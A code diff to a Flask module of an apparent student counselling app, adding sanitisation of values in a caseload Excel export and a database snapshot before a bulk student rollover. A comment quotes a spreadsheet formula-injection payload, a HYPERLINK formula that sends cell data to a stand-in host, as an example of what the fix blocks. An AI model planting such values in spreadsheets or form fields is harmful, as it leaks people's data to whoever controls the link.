@@ -1,5 +1,6 @@
 import io
 import json
+import os
 from datetime import date, datetime, timezone
 from flask import (Blueprint, render_template, request, redirect, url_for,
                    flash, send_file, jsonify, abort)
@@ -10,6 +11,8 @@ from app.models.student import Student, Tag
 from app.models.rollover import RolloverSnapshot
 from app.models.transcript import TranscriptRecord
 from app.utils.audit import log_action
+from app.utils.security import xlsx_safe
+from app.utils.db_snapshot import snapshot_database
 from app.utils.helpers import parse_date
 from app.utils.roles import owned_or_404
 
@@ -903,7 +906,11 @@ def export_caseload():
             s.status,
         ]
         for col_idx, val in enumerate(values, 1):
-            cell = ws.cell(row=row_idx, column=col_idx, value=val)
+            # Names/IDs/emails come from uploaded rosters — an untrusted
+            # boundary. openpyxl coerces a leading '=' into a live formula, so
+            # a student named =HYPERLINK("http://x/?d="&A2,"View") becomes a
+            # click-to-exfiltrate cell in the workbook emailed to admin.
+            cell = ws.cell(row=row_idx, column=col_idx, value=xlsx_safe(val))
             cell.border = thin_border
 
     ws.freeze_panes = 'A2'
@@ -1124,6 +1131,15 @@ def rollover_confirm():
                 .filter(Student.id.in_(action_map.keys()),
                         Student.assigned_counselor_id == current_user.id)
                 .all())
+
+    # Pre-flight snapshot: this mutates every selected student in one commit,
+    # and the RolloverSnapshot undo below expires after 24 hours. Rollover runs
+    # in June; the mistake usually surfaces in August. A file copy here turns
+    # that 24-hour window into a permanent one.
+    snap_path = snapshot_database('pre_rollover')
+    if snap_path:
+        log_action('backup', 'database',
+                   details=f'Pre-rollover snapshot: {os.path.basename(snap_path)}')
 
     counts = {}
     snapshot_items = []
